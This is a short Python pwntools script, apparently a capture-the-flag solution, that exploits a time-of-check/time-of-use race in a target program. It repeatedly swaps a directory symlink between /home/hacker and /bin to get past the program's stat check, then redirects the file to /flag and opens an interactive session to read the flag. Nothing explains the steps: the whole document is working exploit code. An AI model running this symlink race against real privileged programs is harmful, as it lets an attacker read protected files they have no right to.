#!/bin/python

from pwn import *
from os import *
import time

DIR="/home/hacker/dir"
FILE = DIR + "/bash"

def touch_file(file: str):
    system("touch " + file)

try:
    unlink(FILE)
except:
    pass
try:
    unlink(DIR)
except:
    pass

symlink("/home/hacker/", DIR)
touch_file(FILE)

argv = ['nice', '-n19', sys.argv[1], FILE]
if len(sys.argv) > 2:
    argv.insert(0, 'strace')
    argv.insert(0, 'sudo')

proc = process(argv)
proc.sendline()
sleep(0.1)

# now mitigate stat on the dir
unlink(DIR)
symlink("/bin", DIR, target_is_directory=True)

proc.sendline()
sleep(0.1)

unlink(DIR)
symlink("/home/hacker", DIR)
unlink(FILE)
symlink("/flag", FILE)

proc.interactive()
